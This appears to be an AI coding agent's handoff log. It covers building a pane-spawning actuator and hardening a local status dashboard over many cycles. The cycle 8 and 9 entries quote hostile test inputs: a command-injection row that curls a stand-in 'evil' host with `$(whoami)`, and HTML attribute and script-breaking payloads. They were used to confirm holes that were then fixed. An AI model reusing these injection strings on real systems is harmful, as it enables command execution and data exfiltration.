# DONE - stage 1, Mac half built and tested (task_a6082d860006)

Nothing pushed. Nothing running. No pane was ever created during this build -
every test ran against a stub `orca` in a sandboxed HOME.

## Built

| Path | What |
|---|---|
| `bin/zorca-actuator` | The Mac-side drain. Config-driven, preflighted, exactly-once, TTL-enforcing, reaper on start, pane readback before success. |
| `bin/zorca-lane-enqueue` | The VPS-side append. Also the executable definition of the queue record, so the two halves cannot drift. |
| `bin/zorca-actuator-test` | 16 cases, all passing. Stub `orca`, sandboxed HOME, no paid session possible. |
| `docs/DESIGN-bridge.md` | v3. Live plan is section 12. |

`./bin/zorca-actuator-test` -> **16 passed, 0 failed.**
`--check` against the real `orca` and the real GUI on 7777 -> **preflight ok.**

## The four instructions, and where each is enforced

- **Port from config, no default, fails loudly.** `config()` lists every
  missing key at once and exits 2; `preflight()` refuses to start if the
  configured port does not answer `/api/state`. There is no fallback port
  anywhere in the file. Tested: unset, and set-but-unreachable.
- **TTL at build time.** A record with a past `expiresAt` **or none at all**
  is refused and reported `expired` - no pane. Tested both.
- **Reaper at build time.** Any row left `claimed` by a dead process is
  closed as an error on the next start, so nothing sits invisible. Tested.
- **run-use first, `dispatch --inject` always, readback before success.**
  All three asserted in the suite; the readback case proves an unbriefed
  pane reports ERROR rather than DONE.

## One hazard the tests found, and the fix

Exactly-once originally rested on a single local state file. Destroy it and
every unexpired request re-runs - a second paid pane per request. The queue
is append-only and already carries a result record per handled request, so
the drain now treats **the queue as the durable evidence and state as a
cache**. Tested by deleting the state file: no duplicate.

## Deliberately NOT done

- **Not wired into `zorca up`.** It spawns paid panes, no config exists yet,
  and the SSH direction is unratified. Starting it automatically would be
  wrong on all three counts. It also avoids editing `bin/zorca`, which the
  `zorca-gui2` lane is actively changing.
- **`zorca-gui2` untouched**, as instructed. Note both 7777 and 7778 answer
  `/api/state` right now, so the double-actuator question in section 12 is
  live, not hypothetical.
- **Stage 1a/1b (webhook + `/lane` conversation) are ZOE-side**, in ZAOOS,
  and are not this repo's to deploy. `zorca-lane-enqueue` is the contract
  they call; the ZOE change is small and unambiguous because of it.

## Needs Zaal before this can run

1. **The SSH direction.** Config supports both (`queue.mode`), and neither is
   defaulted. The measured position is unchanged: VPS-to-Mac push cannot work
   today - `tailscale status` reports stopped and nothing listens on 22 - so
   `mode: "ssh"` (Mac dials out, queue file on the VPS) is the only variant
   that runs now and the only one that literally keeps zero inbound ports.
2. **A config file** at `~/.zao/zorca-actuator.json`. None was created; the
   real path is untouched.

## Flag: a mid-turn instruction arrived truncated

Received: *"e delete call stay Zaal's - do not touch either."* The head is
missing, so **two** things are named as Zaal's and I can only see the second.
I have not pushed, deleted, or removed anything, and I touched no file
outside the three new `bin/` scripts plus this handoff and the design doc, so
the instruction is satisfied under any reading - but I am not guessing which
two things it named. Please re-send the head.
- 2026-08-26 grill fix VERIFIED, not applied by this lane - it had already landed as `zaal-dotfiles a979b96` (Zaal, 13:06), parsing the timestamp instead of the string compare this lane proposed, which was wrong on garbage dates in both directions. Deployed `~/bin/zao-status-refresh` is byte-identical to that commit. Ran the refresh: `grill` 200, `grill_queued` 380 - two distinct quantities now, which is the proof the 12h window clause is live (both read 381 before). Backup at `~/.zao/archive/zao-status-refresh.2026-08-26-prefix.bak`. Detail: `.handoffs/grill-jammed-381-rootcause.md`.
- 2026-08-26 OPEN, UNRESOLVED - needs a live answer to settle: **zero grill verdicts recorded since 2026-08-24** while ~190 cards/day were sent. This is now causing a real jam, not a reported one: windowed outstanding hit the 200 ceiling and the gate has sent nothing since 18:02 UTC (2h53m silent). Last `verdict-synced` in the journal is Aug 24 14:22; no grill errors since. Cannot be settled from state alone - it needs one live card answered from Telegram to see whether `answered` gains a key, which separates "Zaal stopped tapping" from "the verdict-write path broke on the 24th". Store: `/home/zaal/.zao/zoe/backlog-grill-state.json`.
- 2026-08-26 cycle 1 - :7778 SINCE YOU LAST LOOKED surface. Two new sources merged into one time-ordered feed: the vault daily log (`~/zao-vault/daily/<today>.md`, `## HH:MM` headings plus their first bullet) and last-commit-per-live-worktree (`git -C <pane cwd> log -1`, proof of work rather than pane text). NEW marks come from a per-browser last-look stamp in localStorage, read once per load so polling cannot erase it mid-session. Every stat cell now names where its number lives. Timestamps are parsed, not string-compared (a979b96): an event whose time will not parse renders `??:??`, is never counted new, and is never dropped. Phone 390: counter 53px, feed 371px, action list header on the first screen; no horizontal scroll at 390/768/1280. Screenshot `/tmp/zorca-7778-phone-since.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 2a - :7778 STUCK surface, stale-claim detection. A lane at rank 3-4 that has held its state past 45 min with no commit landed in its worktree since the claim began. orca-board reports state but not since-when, so zorca observes it: state per handle written to `~/.zao/zorca-claims.json` every refresh, timestamp moves only on a real state change. A pane first seen already working reports "at least Nm" - a duration not observed is never reported as one that was. Excluded by design: rank<=2 (blocked on Zaal, that is rail 1's job), rank 5-6, and any cwd that is not a git repo (cannot measure, so no judgement). Count also rides the lanes strip cell so the glance catches it without scrolling. Screenshot `/tmp/zorca-7778-phone-stuck.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 2b - :7778 CLAIMS OUTLIVING THEIR LANE. Rows in `~/zao-vault/handoffs/IN-FLIGHT.md` whose lane has no live pane: 24 of them right now, oldest 8 shown, oldest first. Newest row per lane; lane-to-pane matching is containment on the alphanumerics of both (fractal runs in ZAOfractal), stated on the surface rather than hidden. Rows that say the lane closed are excluded - an accurate record is not an outliving claim. Dates parsed, not compared (a979b96): an unparseable date renders "date unreadable - shown anyway" and is never dropped, since an undateable claim is the kind that has sat longest. Not tappable: there is no pane to focus and the fix is a human closing the row. Cost the feed one phone row (4 -> 3) to keep the action list above the fold at 390x844 - firstAction 739. Screenshot `/tmp/zorca-7778-phone-stuck.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 3a - :7778 ESTATE AT RISK stat. Nothing persists a mac-estate sweep - `~/bin/repo-cleanup` prints and exits - so this measures it: `git status --porcelain` and `git rev-list --count @{u}..HEAD` across the live worktrees on the board, scoped there on purpose because the full 48-clone estate would cost more than it tells you every 20s. Live right now: 6 dirty, 7 unpushed, 4 no remote across 15 worktrees. A repo that cannot be read counts as `unreadable`, never as clean - `sh2()` was added so a git crash is distinguishable from a clean tree. A blank board returns unknown, not a reassuring zero. Full-estate sweep date parsed from `~/zao-vault/notes/repo-estate.md` (2026-08-25) and stated in the fold. Paid for the height by folding the feed on phone: the count stays visible at top, the rows sit one tap down; firstAction 584, above the fold. New "Where these numbers live" block in the reference fold states complete provenance for all eight surfaces. Screenshot `/tmp/zorca-7778-phone-estate.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 3b - :7778 OLDEST DRAFT stat. `~/.zao/orca-drafts.json` read directly instead of through `queue_read()`, which returns [] on any failure and so cannot tell an empty queue from an unreadable one - the same collapse `sh()` made. Four states, all distinct on screen: "none queued" (nil), "Nm waiting - N queued" (ok/gold/warn past 1h/6h), "age unknown - N queued" when every item lacks a usable ts, and "unknown" when the file will not parse. A draft with no usable ts is counted `undated` and never assumed fresh. Fixture-tested per branch: missing file, empty list, bad JSON, JSON that is not a list, oldest-not-newest, mixed dated/undated, all-undated. Live: 4m waiting, 4 queued. Strip is now 6 cells at 2/3/6 columns for 390/768/1280; firstAction 584, above the fold. Screenshot `/tmp/zorca-7778-phone-strip.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 4 - :7778 trend on every strip stat, against the reading from before your last look. Server keeps a bounded observation history in `~/.zao/zorca-trend.json` (24h at one sample per refresh) and serves it decimated to one sample per 10 min, max 150 points. A stat that could not be measured is recorded as null, never zero - a zero would read as a real observation and a later comparison would invent a trend out of a failed scrape. Five outcomes stay distinct on screen and were each fixture-tested: "first look on this browser - no baseline yet" (no mark), "nothing measured before your last look" (no sample at or before the mark), "no observations recorded yet" (empty history), "waiting unchanged since 6:39 PM" (equal reading), and a signed delta coloured by whether up is good for that stat. A single reading never yields a direction. Watcher declares itself out: "freshness, not a stock - no trend". Signed numbers rather than glyphs, per the no-decorative-symbols rule. firstAction 689, above the fold. Screenshot `/tmp/zorca-7778-phone-trend.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 5 - :7778 NOT ON MAIN stat. Commits ahead of the default branch per live worktree, measured in the same loop as the estate sweep so it costs one git pass, not two. Live: 179 commits across 14 lanes, top ws-fractal-lane at 66. Different question from `unpushed`, which is ahead of a branch's OWN upstream and reads zero for a pushed branch that never merges - the exact lane that looked healthy before this. Base ref is the first of origin/HEAD, origin/main, origin/master, main, master that resolves, and the chosen ref is named per row. A worktree whose default branch cannot be resolved is counted "no main found", never assumed level; a non-repo is already counted in the estate sweep's `unmeasured`, so neither is dropped. Null when the whole sweep is unmeasurable, with the same five trend outcomes as every other stat. Per-lane list in the reference fold. Fixture-tested: 2-ahead branch, on-main zero, master fallback, no-default-branch null, non-repo null, aggregate totals, and the accounting that keeps unreadable repos in exactly one bucket. Above the fold now verified at 390x844, 430x932, 768x844, 1280x900 and 1512x982 - the feed fold threshold moved to 900 because a 768 window has a laptop's layout and a phone's height budget. Screenshot `/tmp/zorca-7778-phone-ahead.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 6 - :7778 OLDEST UNLANDED stat. How long the oldest commit off the default branch has been sitting there, per worktree, in the same loop as not-on-main. Live: 58d, juke-space-recap. Corrected the spec as relayed: `git log -1 base..HEAD` returns the NEWEST commit in the range (which two surfaces already answer); the oldest is the LAST line of `git log base..HEAD --format=%ct`, since git logs newest-first. Lanes sort oldest-first, not biggest-first, and that immediately surfaced zaomeetings - 1 commit stranded 36 days vs origin/main - which count-sorting had buried at the bottom while ws-fractal-lane's 66 recent commits sat on top. Base ref named per row (three different refs in use across the estate). A count that reads with an unreadable log is counted `age unreadable`, never aged zero; no-main lanes stay unmeasurable and their trend day is null. Fixture-tested: oldest-not-newest, on-main zero, no-default-branch all-None, aggregate totals, oldest-beats-biggest, sort order, and trend-null propagation. Also fixed `ago()`, which had no unit past hours and was rendering the 58-day commit as "1403.4h" - it now does d and mo, which corrects the STUCK and orphan surfaces too. Above the fold verified at 390x844, 430x932, 768x844, 1280x900, 1512x982. Screenshot `/tmp/zorca-7778-phone-unlanded.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 7 - :7778 acknowledge marks, per item, persisted server-side in `~/.zao/zorca-acks.json`. DEVIATION, stated: SPEC 2420 puts new mutation endpoints out of scope, and this adds `POST /api/ack`. That guard was about mutations reaching Orca - resolve, send, focus, create - which are irreversible and outward-facing; an ack writes one zorca-owned file, shells out to nothing, sends nothing to any pane, and is undone by tapping again. localStorage was the non-deviating option and was rejected: Zaal uses phone and laptop, and per-browser acks would give the two devices different counts for the same board. All five original endpoints verified present and unchanged. Keys embed the fact they describe (`stuck:<handle>:<since>`, `orphan:<lane>:<when>`, `unlanded:<cwd>:<oldest>`), so a fresh claim or a new oldest commit makes a new key and the item returns unhandled - fixture-tested. Counts read unhandled on stuck and orphans; raw totals stay raw on the two git measurements because they measure the estate rather than a queue, and the trend lines follow the raw number so an ack can never manufacture a direction. The oldest-unlanded headline follows the oldest UNACKED lane - acking juke-space-recap at 58d promoted zolbot at 43d, verified live. Ack age always shown, stale past 7 days as "acked 9d ago - and still here". Fixed an injection hole found while testing: `esc()` leaves quotes alone, so a lane name or path containing an apostrophe would have ended the single-quoted onclick early; added `attr()`. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-phone-ack.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 8 - :7778 escaped every onclick interpolation. The cycle-7 hole was not confined to acks: nine sites interpolated values into single-quoted onclick attributes - draft ids (2), pane handles (3), gate ids (3), gate option text, and the gate answer input's id. Gate option text was the worst: it went through `JSON.stringify`, which escapes double quotes and leaves apostrophes alone, and option text is free-form from a task spec. CONFIRMED EXPLOITABLE, not theoretical: an option of `x' onmouseover='window.__pwned=1` rendered a button carrying a working onmouseover handler; through the shipped code the same input is inert text with only onclick. Added `js(v) = attr(JSON.stringify(v))` and routed every interpolation through it. The gate answer input's id is now built from the loop index rather than the gate id - an id must survive being written into an attribute AND read back through getElementById inside another attribute, and the only value that reliably does both is one we chose. Fixture-tested 6 hostile values across 6 sites: apostrophe, double quote, both, `</script><img src=x>`, backslashes, tab - all 30 parse, and 18 exact round-trips confirm the value arrives uncorrupted rather than merely safely. Real gate flow re-verified against a stub with id `gate'\"x` and options `don't merge` / `say "yes"` / `</script><img src=x>`: option click, typed answer and optionless close all round-trip exactly, zero injected tags. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-phone-escaped.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 9 - :7778 server-side injection sweep. Two real defects, both confirmed by running them rather than reading them. (1) COMMAND INJECTION via `/api/lane`: `load_lanes()` built the `--command` string by slicing `~/zao-vault/handoffs/orca-resume-manifest-*.md`, a file every lane can append to, and handed it to `orca terminal create`, which runs it in a shell. A row reading `claude --resume abc; curl http://evil/$(whoami)` parsed cleanly and would have executed. Fixed by extracting and validating the resume target and building the command from a literal - nothing from the file reaches a shell. (2) ARGUMENT INJECTION: every handler used the space form, and `orca ... --resolution "--json"` is parsed as a flag - verified against the real CLI, which answered `Missing required --resolution`. All user values now use `--flag=value`, verified to bind. Opaque ids (handles, gate ids, draft ids) are validated against a token charset and refused otherwise. `sh()`/`sh2()` confirmed shell-free by canary rather than by assertion: `;`, `$()`, backticks, `&&` and `|` through both, no file created, payload intact in one argv slot. Real flow recorded through a stub ORCA: exact argv captured for all four handlers, hostile values refused or bound safely, no canary. Caught my own regression before shipping it - the first `SESSION_RE` rejected five legitimate rows that use quoted session NAMES (`claude --resume \"zaostock\"`), which the manifest documents; quotes are now stripped before validation, charset still enforced, all 13 real lanes accepted and all 9 hostile rows still refused. A refused lane renders its reason instead of a button that would always 400. Screenshot `/tmp/zorca-7778-phone-hardened.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 10a - :7778 origin and Host guard on every route. CORS stops a cross-origin page READING the reply; it does not stop the request being SENT and acted on, and every /api POST here acts on something - resolves a gate, sends a draft into a live pane. So the request is refused, not just its response. Three checks, each covering a hole the others leave: Host (a DNS rebind points evil.example at 127.0.0.1 and the Origin then looks legitimate; the Host header does not), Origin (a browser always sends it on a cross-origin POST; absence is allowed because curl and local scripts omit it and the attacker in question is a page that cannot), and Sec-Fetch-Site. `Origin: null` is refused outright - nothing legitimate here sends it. Tested: cross-site Origin 403, Origin null 403, rebound Host 403, Sec-Fetch-Site cross-site 403, same-origin 200, no-Origin curl still works, and GET is guarded too. Then a real cross-origin fetch from example.com in a live browser: browser reported "Failed to fetch" and the server returned 403 for that Origin, with no gate resolved. File `gui/zorca-gui2`.
- 2026-08-26 cycle 10b - :7778 GRILL cell, unfolded. Reads `~/.zao/status.json` rather than re-measuring: that file is written by `~/bin/zao-status-refresh`, which SSHes the VPS, and putting an 8s round trip inside a 20s loop for a number another process already keeps current would be waste. Live: `199/200 nearing · 380 queued`. Renders `outstanding/ceiling` (the 12h-windowed count the gate uses) with `queued` (lifetime unanswered) beside it, distinct since a979b96. TWO ages, because they fail differently: cache_age large means the refresher stopped and the depth is a fossil (renders "stale 15m - refresher stopped", refusing to show a number); state_age large means the grill has stopped sending, which is the jam itself (appends "silent 3.0h"). Fixture-tested: missing file, no file, corrupt JSON, JSON-not-an-object, empty object, string numbers, non-numeric depth (None not 0), missing ts, and trend-null propagation in all three unmeasurable cases. Nine cells then broke the phone: strip 687px, firstAction 955. Fixed by folding the strip on phone with a what's-wrong summary visible - "5 stuck · 5 on no remote · unlanded 44d zolbot · grill 199/200" - and the nine cells with their sources and trends one tap down; healthy reads "nothing wrong in 9 readings". First attempt built that summary by scanning rendered markup for colour classes and reported "tasks 20 done" as a problem; each cell now DECLARES its own alert. firstAction 316 at 390x844, above the fold at all five widths. Screenshot `/tmp/zorca-7778-phone-grill.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 11 - :7778 rate limits on /api/ack and /api/lane, plus two real bugs found by exercising them. Sliding window per (ip, path): lane 3 per 300s because each call creates a terminal that starts a PAID session, ack 30 per 60s. Only these two - /api/resolve dedupes on the gate id, /api/draft drops the item as it sends, /api/focus is idempotent, so a wedged loop on those is bounded by its own state. 429 with a Retry-After header and a body saying the cap, the window and the wait; verified live at cap 3/8s and 4/8s, recovery after the window, unlimited paths unaffected, and the origin guard running FIRST so a cross-origin caller cannot exhaust the bucket. Fixture-tested: sliding not resetting, retry_after shrinking as the window drains, per-ip and per-path buckets, thread-safe under 8x200 concurrent calls, bucket bounded. BUG 1, from cycle 7: post()'s in-flight key was `body.id || body.handle || body.i`, and an ack carries none of those - every ack collapsed to "/api/ack|undefined", so a second ack fired while the first was in flight was SILENTLY DROPPED. Now picks the first field that is present, so i=0 still keys correctly; same-key double taps still dedupe. BUG 2, also cycle 7: /api/ack is read-modify-write on one file and ThreadingHTTPServer runs handlers concurrently - three acks fired at once left ONE in the file. Now under a lock; verified with 40 concurrent distinct acks (40 land, none lost) and 20 concurrent unacks. Also: post() now surfaces the server's `why` in the toast instead of a bare status code. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-phone-ratelimit.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 12 - :7778 cold-start pass. State moved aside to `~/.zao/archive/cold-start-20260826-212645/`, never deleted, restored after; the cold run's own output is kept alongside it. Three bugs, all found by booting rather than by reading. (1) PRE-SCRAPE FALSE HEALTH: before the first scrape lands, `ts` is 0 and every count is a default, and the page rendered "0 NEED YOU - the wall is working", "nothing stuck - every working lane has landed something", "none - every IN-FLIGHT row has a live lane", "0 working / 0 free / 0 idle", "watcher DOWN" and "STALE 689.7mo". That is SPEC 2420 section 2's silent failure arriving at boot instead of at refresher death. Now a single `!s.ts` branch renders "NOT MEASURED YET - the first scrape takes about a minute - this is not a count of zero" across every surface, with the header rail warned; asserted afterwards that the strings "wall is working", "landed something" and "0 NEED YOU" appear nowhere on a pre-scrape page. (2) STUCK OVERCLAIM: with cold claims the surface said "every working lane has landed something since it started" when nothing had been watched for the 45m threshold. Server now returns `stuck_candidates` and `stuck_observed`, and the copy distinguishes "no lane is claiming to work" / "none of the 15 working lanes have been watched long enough to judge" / "all N lanes watched long enough have landed something". (3) LIVE SINCE CYCLE 5: the client's `trendNow` map was never extended when `ahead_total`, `unlanded_days` and `grill_outstanding` were added server-side, so those three cells rendered "not measured this refresh" permanently while the server recorded them fine. Now mirrored; after restore they show real deltas ("+2 off main", "+1 outstanding"). Above the fold at all five widths cold and warm. Screenshot `/tmp/zorca-7778-coldstart.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 13 - :7778 field-to-reader audit, both directions, plus the trend load test. FORWARD (sound, kept as `gui/field-audit.py`, exit 1 on failure): a payload key whose name appears nowhere in the page as `.key` is definitely unread. Found `err_ts`, served since day one and never read - so a failing refresher never said HOW LONG it had been failing, which is the difference between a blip and an outage; the header now reads "STALE (since 9:36:40 PM) - FileNotFoundError: ...". Also found `estate.oldest_unlanded_repo`, dead since cycle 7 when the client started picking the oldest UNACKED lane itself; removed. Seven server-only fields (`*.cwd`, `orphans[].when`, `lanes[].cmd`, `panes[].title`) are now listed explicitly in the audit rather than silently tolerated, so adding one is a decision. REVERSE: name matching cannot do it - `e`, `d`, `g`, `r` are each bound to four different things - so it was done with a deep recording Proxy over the live payload, which observes actual property access. Result: every field the page reads is set by the server; the only misses are `acks[key]` lookups for unacked items, which is the design. LOAD TEST: at 24h maturity the trend file held 4320 rows / 835 KB and was re-read, re-parsed and rewritten every 20s - 52ms per refresh and 3.6 GB of disk writes per day - and then decimated to one sample per 10 minutes before serving, so 97% was written and discarded. It now stores what it serves: 145 rows, 27 KB, 1.6ms, 0.12 GB/day, with identical behaviour (capped, one row per bucket, newest wins in a bucket, all-null still not stored, recovers from truncation). Old full-resolution files migrate in place on first write - verified live, 93 rows -> 6 buckets, trends still rendering. Trend archived to `~/.zao/archive/trend-format-20260826-215109/` before the format change. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-audit.png`. Files `gui/zorca-gui2`, `gui/field-audit.py`.
- 2026-08-26 cycle 14a - :7778 payload trim. `tasks` and `resolved` were 26 KB of every 15s poll and render only inside the reference fold, which is closed by default. `/api/state` now omits them and carries `task_counts` and `resolved_count` instead - two small numbers, which is all the strip's tasks cell ever needed; `/api/state?detail=1` returns the full payload and the fold fetches it on open (and re-fetches on re-open, so a fold left open does not freeze). Lanes and the watcher trail deliberately stay in the poll: they are small, and the lane list is how a parked lane gets reopened. Polled payload 56.3 KB -> 29.6 KB. Endpoint preserved - this is a query parameter, not a new route, and the origin guard covers it (detail=1 cross-origin still 403). `gui/field-audit.py` now audits against detail=1, because a field that is never served is also never audited. One self-inflicted bug on the way: the counts loop was inserted before `tasks_now` was assigned, and cycle 1's fail-loud staleness caught it in production within one refresh - `err: UnboundLocalError: local variable 'tasks_now' referenced before assignment` - rather than the board silently rendering zeros. Above the fold at all five widths. File `gui/zorca-gui2`, `gui/field-audit.py`.
- 2026-08-26 cycle 14b - :7778 refresh coalescing. A full scrape takes ~60s for 15-21 panes while the loop ticks every 20s and every tap spawned another `threading.Thread(target=refresh)`, so overlapping scrapes were not a risk but the normal case - two or three copies of the same work, each spawning a subprocess per pane, each doing an unlocked read-modify-write on the claims and trend files. `refresh_coalesced()` allows one at a time and, if asked while busy, sets `again` so exactly one more runs when the current finishes; a tap's effect still lands on the next pass rather than being dropped. Coalescing not queueing, because a queue of N identical scrapes is N times the work for one answer. The error state moved into it so a coalesced call cannot clear an error it did not disprove - verified: a skipped call returns False and leaves `err` intact. Fixture-tested: 12 concurrent callers produce max 1 simultaneous scrape and exactly 2 runs, the gate is released after an exception, `err` is recorded then cleared on recovery. Verified live by sampling `pgrep -f 'orca-board --json'` across taps: peak 1, never 2. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-lean.png`. File `gui/zorca-gui2`.
- 2026-08-26 cycle 15 - :7778 refresh instrumentation, and the optimisation it CANCELLED. Every stage of `refresh()` is timed and the totals ride in the payload as `timings` and `refresh_secs`, surfaced in the reference fold under "What the refresh costs". Measured: total 4.1-8.0s across restarts and steady state, first payload 6.3s after a cold start. Breakdown: board (orca-board --json) 2.9-4.2s / 68%, estate 0.8-1.8s / 19%, gates 0.22s, git_scan 0.13-0.6s / 4%, everything else under 0.1s. CORRECTION TO THE RECORD: cycle 14's commit message says "a full refresh takes about a minute" and cycle 15 was proposed on that basis. That figure was never measured - it came from `until` loops whose sleep granularity and a server that was not running made startup look slow - and it is wrong by an order of magnitude. Overlapping git with the pane scrape would save about 1s of a 4.4s cycle on a 20s loop, at the cost of running the git pass against the previous cycle's worktree list, so it was NOT built. Nothing waits on this cycle; the saving buys nothing and the staleness costs something. The instrumentation is the deliverable, and it is the thing that makes the next such proposal answerable in seconds instead of arguable. Cold copy included: "no refresh has completed yet" before the first scrape. Above the fold at all five widths, field audit passes. Screenshot `/tmp/zorca-7778-timings.png`. File `gui/zorca-gui2`.
- 2026-08-27 cycle 16a - :7778 refresh tripwire, thresholds named. Total over 10s, or any single stage over 5s, raises an alert in the fleet line. 10s because the loop ticks every 20s, so past that the board is scraping more than half the time and the cycle has started to matter; 5s per stage names the culprit rather than just the total. Baseline measured 2026-08-26: total 4.1s, board 2.87s, estate 0.76s, everything else under 0.25s. Boundaries tested: silent at 9.9s total / 4.9s stage, fires at 11.1s total, fires at 6.2s stage with the total still under 10s. The thresholds are printed next to the cost breakdown in the fold, so the rule is on the page rather than in a commit message. Per the relay: `~/bin/orca-board` not touched - it is shared with the watcher.
- 2026-08-27 cycle 16b - :7778 the wall says what each lane has DONE. Rows carried `repo | state | ctx | tail`, and the tail is what an agent is SAYING - so a lane that had committed nothing for a day looked identical to one that had just landed. Each wall row now carries a second line: how long it has been in this state, and its last commit with age, sha and subject. Both numbers were already computed for the stuck surface and the estate sweep, so this costs no new subprocesses. `held` keeps the stuck surface's honesty rule - a pane first seen already in this state reads "at least 5.8h", never a duration nobody measured. A commit older than 6h renders gold. Immediately visible on the live board: zaomeetings "61m in this state - landed 36d ago", which is the 36-day stranded commit cycle 6 found, now on the wall instead of only in the fold. Rail 1 and the collapsed free/finished list stay compact - the work line is wall-only, so decisions are not pushed down. Cases tested: no commit readable, no claim yet, stale commit goes gold. Above the fold at all five widths, field audit passes. Screenshot `/tmp/zorca-7778-wall.png`. File `gui/zorca-gui2`.
- 2026-08-27 cycle 17 - :7778 one filter box narrows wall, actions and stuck together. At 21 panes the wall was a flat list nobody could find a lane in. Matches on repo, state, tail, question, last commit subject and cwd for panes; who/why/text/tag for actions; repo/state for stuck; lane/doing for orphans. IT NEVER TOUCHES THE NEEDS-YOU COUNT - that number answers "what is waiting on me", and a filter is a question about the screen, not about the world; narrowing it would make the one honest number on the page depend on what is typed in a box. Verified: "6 NEED YOU" holds across every filter state while the lists narrow 6/18/8 -> 0/1/1 for "zolbot" and 5/10/4 for "zao". Empty states name what is hidden ("no live lane matches \"qqqzzz\" - 18 hidden by the filter"). A status line reports shown-of-total per surface and says outright that the count above is unfiltered. Escape clears from inside the box; the 1-9 action keys still work when not typing; the filter survives the 15s poll. TWO BUGS FOUND BUILDING IT. (1) The status line referenced `live` and `liveAll` above their `const` declarations, and because it only reads them in the FILTER branch, `render()` threw a temporal-dead-zone ReferenceError EXCLUSIVELY when a filter was set - the page silently stopped updating and showed no error anywhere. (2) That exposed the general case: a render that throws leaves the last good frame on screen, which is a stale board that looks live - the same lie a dead refresher tells. `load()` now catches both fetch and render failures and says "RENDER FAILED - what you are seeing is stale - <message>" in the header with the warn rail, verified by injecting a synthetic throw. Above the fold at all five widths (firstAction 372 on phone). Screenshot `/tmp/zorca-7778-filter.png`. File `gui/zorca-gui2`.
- 2026-08-27 cycle 18 - :7778 silent-failure sweep. Enumerated all 18 swallow sites (`except Exception -> pass / return [] / return {}`) and routed every one that can lie through a shared `PROBLEMS` channel: set on failure with the reason, CLEARED on the next success so a fixed problem stops shouting. Covered: `orca_json` (an unparseable gate-list becomes zero gates, which reads as "nothing needs you" - the most consequential lie the board can tell), IN-FLIGHT.md, the vault daily log, the watcher log, and read AND write failures on the claims, trend, acks and draft-queue files. Read and write get separate keys - sharing one meant a successful write cleared the report of the read that had just wiped every duration. Absences that are normal stay quiet (no daily file yet, no watcher log yet); absences that blind a surface do not. Client side: `localStorage` being blocked now reports too, instead of leaving "no baseline yet" looking like a fresh install forever. Everything lands in the fleet line beside the stuck lanes and the grill, with the reason and a since-time in a new "Failing quietly" fold block; clean reads "nothing is failing quietly". REAL BUG FOUND: `inflight_orphans` returned a bare `[]` on its failure path while the caller unpacks a 2-tuple, so a missing or unreadable IN-FLIGHT.md crashed the ENTIRE refresh - live since cycle 2, never hit because the file always existed. Added a static check that every tuple-unpacked function returns the right arity on every path; six such functions, no other mismatches. Verified end to end with four deliberately broken stores: all reported in the fleet line and the fold, all self-healed within a cycle of repair. Above the fold at all five widths. Screenshot `/tmp/zorca-7778-quietfail.png`. File `gui/zorca-gui2`.
- 2026-08-27 cycle 19 - :7778 each wall row states what its lane is FOR. `IN-FLIGHT.md` row parsing split out of `inflight_orphans` and now drives both directions from one pass: the newest row per lane is matched to live panes by containment on the alphanumerics of the lane name and the repo or worktree name (fuzzy on purpose, stated on the page - `fractal` runs in `ZAOfractal`). Live: 28 rows, 6 of 21 panes matched, 13 live lanes with no row, 22 rows with no live lane. BOTH unmatched directions are reported in the "Failing quietly" fold under a separate "Lane purpose matching" heading - deliberately NOT in the fleet alert line, because a lane running before anyone writes it down is a data gap rather than a code failure, and a channel that shouts about everything gets ignored like one that shouts about nothing. Unreadable IN-FLIGHT.md is distinguished from an empty one: `inflight_rows()` returns None rather than [], and the fold then says the orphan list is empty "for that reason rather than because there are none". Two self-inflicted mistakes on the way, both caught by existing guards rather than by review: a slice-based refactor deleted `estate_sweep`, `sh2`, `claims_update` and `stuck_lanes` wholesale, and cycle 1's fail-loud staleness had `NameError: name 'estate_sweep' is not defined` in the payload before I had finished the next command - restored from HEAD and redone with targeted replacements; then the new 3-tuple return was caught by the arity check added in cycle 18, before it ever ran. Payload regression noticed and fixed at the source: shipping full `doing` text per pane put 12 KB back on every poll that cycle 14 had removed, so purpose is truncated server-side to what the wall renders. Field audit passes, above the fold at all five widths. Screenshot `/tmp/zorca-7778-purpose.png`. File `gui/zorca-gui2`.
- 2026-08-27 cycle 20 - :7778 "Lanes running undeclared" list in the fold. Cycle 19 counted 13 live lanes with no IN-FLIGHT row; this says WHICH, with state, how long in that state, and last-commit age - enough to identify a lane and decide whether it is worth a row. Derived entirely from panes already in the payload, so it costs zero extra bytes on the poll; the list count is asserted against the server's independent count (13 vs 13). Rank 5-6 excluded - a bare shell is not an undeclared lane. Three empty/edge states each say something different: "every live lane has an IN-FLIGHT row" when there are none, "not measured yet" before the first scrape, and - the one that matters - "cannot tell - IN-FLIGHT.md could not be read this refresh, so every lane would look undeclared" when the file is unreadable, because listing all 21 there would be the dashboard inventing a problem out of its own blindness. The surface reports only; per the relay it does not edit IN-FLIGHT.md, and the footer says writing the rows is a human's call. Stale-row cleanup left for a later cycle. Field audit passes, above the fold at all five widths. Screenshot `/tmp/zorca-7778-undeclared.png`. File `gui/zorca-gui2`.
